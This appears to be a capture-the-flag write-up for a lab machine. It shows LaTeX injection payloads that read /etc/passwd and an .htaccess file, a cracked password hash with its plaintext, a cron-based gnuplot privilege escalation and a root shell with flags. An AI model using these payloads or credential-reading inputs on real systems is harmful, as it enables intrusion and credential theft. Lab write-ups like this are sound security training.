## Enumeration
```
└─# nmap -sV -Pn -p- --min-rate 3000 $ip                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-27 19:45 GMT
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.67% done; ETC: 19:46 (0:00:01 remaining)
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.84% done; ETC: 19:46 (0:00:00 remaining)
Nmap scan report for 10.10.11.217
Host is up (7.0s latency).
Not shown: 65011 filtered tcp ports (no-response), 522 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  tcpwrapped
```
I will visit the web on port 80,
i found : `• LaTeX Equation Generator - create .PNGs of LaTeX equations in your browser
• PHPMyRefDB - web application to manage journal citations, with BibTeX support! (currenty in development)`
when i click on latex equation i found : `http://latex.topology.htb/equation.php`, i will add it on my hosts
I reload the website and found : LaTeX Equation Generator
I googled it and found some CVE, then i searched for Latex Injection.
Ressources : `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection`
I bypassed the illegal commands by this : `$\lstinputlisting{/etc/passwd}$`
### Methods for User
Here in the passwd we have seen a user `vdaisley`,  we can use hydra to crack his password using rockyou or also use this methods.
### Second Methods
sudomain bruteforce i found `dev` and `stats`
accessed on this : `$\lstinputlisting{/var/www/dev/.htaccess}$`
I found a user and passwd.
`vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`
Cracking the password
```
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 1.27% (ETA: 20:17:19) 0g/s 69206p/s 69206c/s 69206C/s nissan2..negra14
0g 0:00:00:05 2.17% (ETA: 20:17:14) 0g/s 70863p/s 70863c/s 70863C/s buwisit..bulang
calculus20       (?)     
1g 0:00:00:15 DONE (2023-10-27 20:13) 0.06501g/s 64740p/s 64740c/s 64740C/s calebd1..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
`user: c3f75926c6e4829022bfc2e5ad3fd325`
## Privilege Escalation
I run Linpeash and found Pwnkit
```
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 47 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
-rw-r--r-- 1 www-data www-data 47 Jan 17  2023 /var/www/dev/.htpasswd
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```
also found these hashes.
On tmp file also i found pspy64
when i run pspy64.
```
2023/10/27 16:47:15 CMD: UID=0     PID=1      | /sbin/init 
2023/10/27 16:48:01 CMD: UID=0     PID=71766  | /usr/sbin/CRON -f 
2023/10/27 16:48:01 CMD: UID=0     PID=71765  | /usr/sbin/CRON -f 
2023/10/27 16:48:01 CMD: UID=0     PID=71768  | /bin/sh /opt/gnuplot/getdata.sh 
2023/10/27 16:48:01 CMD: UID=0     PID=71767  | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/10/27 16:48:01 CMD: UID=0     PID=71772  | /bin/sh /opt/gnuplot/getdata.sh 
2023/10/27 16:48:01 CMD: UID=0     PID=71771  | /bin/sh /opt/gnuplot/getdata.sh 
2023/10/27 16:48:01 CMD: UID=0     PID=71770  | /bin/sh /opt/gnuplot/getdata.sh 
2023/10/27 16:48:01 CMD: UID=0     PID=71769  | /bin/sh /opt/gnuplot/getdata.sh 
```
i found gnuplot.
`https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/?source=post_page-----1e4cf07d7805--------------------------------
`
```
-bash-5.0$ /bin/bash -p
bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
bash-5.0# whoami
root
bash-5.0# cat root.txt
8072065e1b35829342207ed420d4c7e9
```
